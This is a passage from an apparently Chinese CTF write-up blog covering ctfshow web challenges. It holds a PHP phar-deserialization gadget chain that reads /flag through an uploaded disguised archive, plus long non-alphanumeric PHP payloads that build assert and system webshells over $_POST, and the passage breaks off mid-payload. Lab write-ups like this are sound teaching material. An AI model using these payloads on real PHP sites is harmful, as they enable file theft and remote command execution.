&quot;</span>.<span class="variable">$this</span>-&gt;fun.<span class="string">&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$stat</span> = @<span class="built_in">stat</span>(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__toString() <span class="comment">//把类当作字符串使用时触发 echo 对象; $text=$test+$对象； </span></span><br><span class="line">__invoke() <span class="comment">//当尝试以调用函数的方式调用一个对象时，该方法会被自动调用</span></span><br></pre></td></tr></table></figure>

<p><strong>生成 .phar 文件：</strong></p>
<p>我们的目的是成功创建 View 对象然后成功调用 __invoke() 方法，利用 file_get_contents 来读取到文件中的内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class View&#123;</span><br><span class="line">    public <span class="variable">$fn</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__invoke</span></span>()&#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$this</span>-&gt;fn));</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;&quot;</span>.<span class="variable">$text</span>.<span class="string">&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Fun&#123;</span><br><span class="line">    public <span class="variable">$fun</span>=<span class="string">&#x27;:)&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>()&#123;</span><br><span class="line">        <span class="variable">$fuc</span> = <span class="variable">$this</span>-&gt;fun;</span><br><span class="line">        <span class="variable">$fuc</span>();</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Just a fun &quot;</span>.<span class="variable">$this</span>-&gt;fun.<span class="string">&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = new Phar(<span class="string">&#x27;123.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&amp;lt;?= __HALT_COMPILER(); ?&amp;gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = new Fun();</span><br><span class="line"><span class="variable">$b</span>-&gt;fun= new Fun();</span><br><span class="line"><span class="variable">$b</span>-&gt;fun-&gt;fun=new View(); <span class="comment"># 当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用</span></span><br><span class="line"><span class="variable">$b</span>-&gt;fun-&gt;fun-&gt;fn=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span> -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br></pre></td></tr></table></figure>

<ul>
<li><code>&lt;?</code> 过滤，使用 实体html 编码代替 ，<code>&amp;lt;    &amp;gt;</code>   </li>
</ul>
<p>访问，生成 123.phar</p>
<p>更改后缀得到 123.zip</p>
<p>上传</p>
<p>查询 123.zip</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file=phar://123.zip</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/16/Zvp58TYJkoBsUfO.png" alt="image-20210816154246098"></p>
<p><img src="https://i.loli.net/2021/10/01/p8VCePGW9IHAQd6.png" alt="image-20210816113908803"></p>
<h2 id="魔女"><a href="#魔女" class="headerlink" title="魔女"></a>魔女</h2><p><img src="https://i.loli.net/2021/08/14/IekhA6SdQWPnt7N.png" alt="image-20210814201633444"></p>
<p>注册</p>
<p><img src="https://i.loli.net/2021/08/14/KmC57VgziIMBRa4.png" alt="image-20210814201610476"></p>
<p>注册成功，登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">layui.use([<span class="string">&#x27;layer&#x27;</span>, <span class="string">&#x27;form&#x27;</span>,<span class="string">&#x27;table&#x27;</span>,<span class="string">&#x27;element&#x27;</span>], <span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">	  var layer = layui.layer</span><br><span class="line">	  ,form = layui.form</span><br><span class="line">	  ,table = layui.table</span><br><span class="line">	  ,element = layui.element</span><br><span class="line"></span><br><span class="line">	&#125;);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">home</span></span>()&#123;</span><br><span class="line">    $.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;main&#x27;</span>);</span><br><span class="line">    $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    location.replace(location.href);</span><br><span class="line">  &#125;</span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">logout</span></span>()&#123;</span><br><span class="line">		$.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;logout&#x27;</span>);</span><br><span class="line">		$.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">		location.replace(location.href);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">saveAvatar</span></span>()&#123;</span><br><span class="line">		$.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;download&#x27;</span>);</span><br><span class="line">	    $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;avatar.jpg|true&#x27;</span>);</span><br><span class="line">	    window.open(location.href);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">avatar</span></span>()&#123;</span><br><span class="line">		layer.prompt(&#123;</span><br><span class="line">		  formType: 0,</span><br><span class="line">		  value: <span class="string">&#x27;http://xxx.com/x.jpg(其他格式无效)&#x27;</span>,</span><br><span class="line">		  title: <span class="string">&#x27;修改头像&#x27;</span>,</span><br><span class="line">		&#125;, <span class="keyword">function</span>(value, index, elem)&#123;</span><br><span class="line">      layer.close(index);</span><br><span class="line">		  $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;xixi|&#x27;</span>+value);</span><br><span class="line">		  $.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;changeavatar&#x27;</span>);</span><br><span class="line">      location.replace(location.href);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">profile</span></span>()&#123;</span><br><span class="line"></span><br><span class="line">		$.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;page&#x27;</span>);</span><br><span class="line">	    $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">	    location.replace(location.href);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">changePSW</span></span>()&#123;</span><br><span class="line">		layer.prompt(&#123;</span><br><span class="line">		  formType: 0,</span><br><span class="line">		  value: <span class="string">&#x27;请输入当前密码&#x27;</span>,</span><br><span class="line">		  title: <span class="string">&#x27;修改密码&#x27;</span>,</span><br><span class="line">		&#125;, <span class="keyword">function</span>(value, index, elem)&#123;</span><br><span class="line">		  $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+value);</span><br><span class="line">		  layer.close(index);</span><br><span class="line">		  layer.prompt(&#123;</span><br><span class="line">		  formType: 0,</span><br><span class="line">		  value: <span class="string">&#x27;请输入新密码&#x27;</span>,</span><br><span class="line">		  title: <span class="string">&#x27;修改密码&#x27;</span>,</span><br><span class="line">			&#125;, <span class="keyword">function</span>(value, index, elem)&#123;</span><br><span class="line">			  layer.close(index);</span><br><span class="line">			  $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,$.cookie(<span class="string">&#x27;ctfshow&#x27;</span>)+<span class="string">&#x27;|&#x27;</span>+value);</span><br><span class="line">			  $.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;changepwd&#x27;</span>);</span><br><span class="line">			  location.replace(location.href);</span><br><span class="line">			&#125;);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h2 id="shellme-Revenge"><a href="#shellme-Revenge" class="headerlink" title="shellme_Revenge"></a>shellme_Revenge</h2><p><img src="https://i.loli.net/2021/08/14/R9IkSsTqpHV1dtf.png" alt="image-20210814203429707"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/?looklook=1</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);<span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;looklook&#x27;</span>])&#123;    highlight_file(__FILE__);&#125;<span class="keyword">else</span>&#123;    setcookie(<span class="string">&quot;hint&quot;</span>, <span class="string">&quot;?looklook&quot;</span>, time()+3600);&#125;<span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];    <span class="keyword">if</span> (is_string(<span class="variable">$ctfshow</span>) || strlen(<span class="variable">$ctfshow</span>) &lt;= 107) &#123;        <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;            <span class="built_in">eval</span>(<span class="variable">$ctfshow</span>);        &#125;<span class="keyword">else</span>&#123;            <span class="built_in">echo</span>(<span class="string">&quot;fucccc hacker!!&quot;</span>);        &#125;    &#125;&#125; <span class="keyword">else</span> &#123;    phpinfo();&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>assert()</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php<span class="variable">$_</span>=[];<span class="variable">$_</span>=@<span class="string">&quot;<span class="variable">$_</span>&quot;</span>; // <span class="variable">$_</span>=<span class="string">&#x27;Array&#x27;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; // <span class="variable">$_</span>=<span class="variable">$_</span>[0];<span class="variable">$___</span>=<span class="variable">$_</span>; // A<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // S<span class="variable">$___</span>.=<span class="variable">$__</span>; // S<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // E <span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // R<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // T<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // P<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // O<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // S<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // T<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="built_in">eval</span>(<span class="variable">$___</span>(<span class="variable">$_</span>[_])); // ASSERT(<span class="variable">$_POST</span>[_]);</span><br></pre></td></tr></table></figure>

<p><strong>system()</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php<span class="variable">$_</span>=C;//<span class="variable">$_</span>=<span class="variable">$_</span>[0]; //Cprint_r(<span class="variable">$_</span>);<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>=<span class="variable">$__</span>; // Sprint_r(<span class="variable">$__</span>);//<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // Y<span class="variable">$___</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // Sprint_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // Tprint_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // Eprint_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // Mprint_r(<span class="variable">$__</span>);print_r(<span class="variable">$___</span>); //SYSTEM<span class="variable">$____</span>=_;<span class="variable">$__</span>=<span class="variable">$_</span>;//print_r(<span class="variable">$_</span>);<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // P<span class="variable">$____</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // O<span class="variable">$____</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // S<span class="variable">$____</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // T<span class="variable">$____</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$____</span>);//_POSTprint_r(<span class="variable">$___</span>);//SYSTEM<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="built_in">eval</span>(<span class="variable">$___</span>(<span class="variable">$_</span>[_])); // SYSTEM(<span class="variable">$_POST</span>[_]);</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php//<span class="variable">$_</span>=[C];<span class="variable">$_</span>=<span class="variable">$_</span>[0];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>=<span class="variable">$__</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="built_in">eval</span>(<span class="variable">$___</span>(<span class="variable">$_</span>[_]));//<span class="variable">$_</span>=C;<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>=<span class="variable">$__</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=_;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span 